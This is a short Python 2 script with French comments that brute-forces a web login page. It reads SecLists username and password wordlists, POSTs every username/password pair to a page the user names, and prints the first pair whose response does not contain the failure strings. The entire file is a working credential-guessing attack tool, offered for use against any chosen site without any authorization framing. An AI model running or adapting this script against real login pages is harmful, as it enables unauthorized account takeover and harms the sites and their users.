#! /usr/bin/env python
# -*-coding: utf-8-*-

import httplib, urllib, re, sys, getopt
from urlparse import urlparse

# ce script permet de faire du bruteforce sur une page d'authentification sur internet

# variables globales
target_page = ''
usernames_file = '/usr/share/wordlist/SecLists-master/Usernames/top_shortlist.txt'
passwords_file = '/usr/share/wordlist/SecLists-master/Passwords/10_million_password_list_top_10000.txt'


#==================================================================================================

def usage():
	# fonction affichant l'utilisation du programme

	print "e-Daho Bruteforce\n"
	print "Usage : bruteforce_auth.py -t target_page"
	print "-u --usernames     - fichier d'identifiants"
	print "-p --passwords     - fichier de mots de passe"
	print "\n"
	print "Exemples : "
	print "bruteforce_auth.py -t www.monsite/authentification.fr"
	print "bruteforce_auth.py -t www.monsite/authentification.fr -u /home/user/wordlist/usernames.txt"
	print "bruteforce_auth.py -t www.monsite/authentification.fr -p /home/user/wordlist/passwords.txt"
	sys.exit(0)


#==================================================================================================


def main():
	# fonction exécutant le programme en fonction des paramêtres d'entrée

	global target_page
	global usernames_file
	global passwords_file

	if not len(sys.argv[1:]):
		usage()

	# on lit les options entrées en ligne de commande
	try:
		opts, args = getopt.getopt(sys.argv[1:], "ht:u:p:",
			["help", "target", "usernames", "passwords"])
	except getopt.GetoptError as e:
		print str(e)
		usage()

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-t", "--target"):
			target_page = a
		elif o in ("-u", "--usernames"):
			usernames_file = a
		elif o in ("-p", "--password"):
			passwords_file = a
		else:
			assert False, "Option non gérée"

	if len(target_page):
		bruteforce()

	else:
		usage()


#==================================================================================================


def bruteforce():
	# fonction permettant de faire du bruteforce sur le site choisi par l'utilisateur

	# booléen permettant de stopper le programme en cas de succès
	find = False

	# on charge les wordlists des usernames et des mots de passe
	usernames = list(open(usernames_file, 'r'))
	passwords = list(open(passwords_file, 'r'))

	# on récupère le nom de domaine et la page concernée
	domaine = urlparse("//%s" %target_page).netloc
	page = urlparse("//%s" %target_page).path
	print "%s, %s" %(domaine, page)

	# on crée les headers
	headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain" }

	# on ouvre une connexion avec le site désiré
	conn = httplib.HTTPConnection(domaine, 80)

	# pour chaque identifiants
	for username in usernames:

		# et pour chaque mot de passe
		for password in passwords:

			# on encode les informations de la requête post
			params = urllib.urlencode({'log': username.rstrip(), 'mot_de_passe' : password.rstrip()})

			# on affiche le couple pseudo/password qu'on essaie
			print "%s  %s" %(username.rstrip(),password.rstrip())

			# on envoie notre requete POST sur la page souhaitée
			conn.request("POST", page, params, headers)

			# on récupère le corps de la réponse du serveur
			texte = conn.getresponse().read()

			# si la réponse n'est pas "mauvais mot de passe" et qu'on ne demande pas de password
			if "Mauvais" not in texte and "password" not in texte:

				# on renvoie les identifiants associés
				print "=============================="
				print "  Authentification réussie !  "
				print "      %s  %s     " %(username, password.rstrip())
				print "=============================="

				# on renvoie True
				find = True

				# on sort de la boucle des passwords
				break

		# si on a trouvé les identifiants, on arrête la boucle sur les pseudo
		if find:
			break

	# on ferme la connexion
	conn.close()



if __name__ == "__main__":
	main()
